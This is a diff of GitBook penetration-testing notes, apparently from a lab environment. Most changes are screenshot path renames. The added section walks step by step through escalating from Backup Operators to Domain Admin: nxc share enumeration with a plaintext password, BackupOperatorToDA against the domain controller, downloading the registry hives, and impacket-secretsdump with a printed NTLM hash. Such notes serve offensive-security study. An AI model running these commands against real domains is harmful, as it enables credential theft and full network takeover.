@@ -57,7 +57,7 @@ nslookup appsrv01
     * OR Krbrelayx attack on unconstrained delegation
       *
 
-          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
       * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
@@ -177,7 +177,7 @@ nslookup appsrv01
 
     * Enumerate the user logged in to MSSQL --> logged in as the domain admin
 
-    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -333,7 +333,7 @@ nslookup appsrv01
       ```
 
 
-- **Check if commands are restricted:** ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
+- **Check if commands are restricted:** ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
   *   <pre class="language-powershell"><code class="lang-powershell">[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
       # NoLanguageMode --> likely restricted by JEA.
 
@@ -391,7 +391,7 @@ nslookup appsrv01
     Get-Command -Module Microsoft.ActiveDirectory.Management | Where-Object { $_.Name -like "Get-*" }
     ```
 
-    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 *   ```powershell
@@ -432,3 +432,56 @@ nslookup appsrv01
 
 
 </details>
+
+<details>
+
+<summary>Exploiting Backup Operators To Domain Admin</summary>
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+First, Enumerate writable shares:
+
+```bash
+nxc smb 192.168.210.0/24 -u melissa -p WinterIsHere2022! --shares
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Exploit using [https://github.com/mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)
+
+```bash
+.\BackupOperatorToDA.exe -t \\ZPH-SVRCDC01.internal.zsm.local -o \\ZPH-SVRCDC01.internal.zsm.local\c$\
+```
+
+Login and download the files from smb share using smbclient:
+
+```
+smbclient //ZPH-SVRCDC01/C$ -U=internal.zsm.local/melissa
+# Since the SYSTEM file is large, have to increase the timeout and iosize:
+timeout 120
+iosize 16384
+
+# Download the 3 files
+get SAM
+get SECURITY
+get SYSTEM
+```
+
+Secretsdump --> get machine account hash
+
+```
+impacket-secretsdump LOCAL -system SYSTEM -security SECURITY -sam SAM
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Using machine acc hash, use secretsdump to dump creds on the DC --> get Domain Admin hash
+
+```bash
+impacket-secretsdump internal.zsm.local/'ZPH-SVRCDC01$'@ZPH-SVRCDC01.internal.zsm.local -hashes :d47a6d90e1c5adf4200227514e393948
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
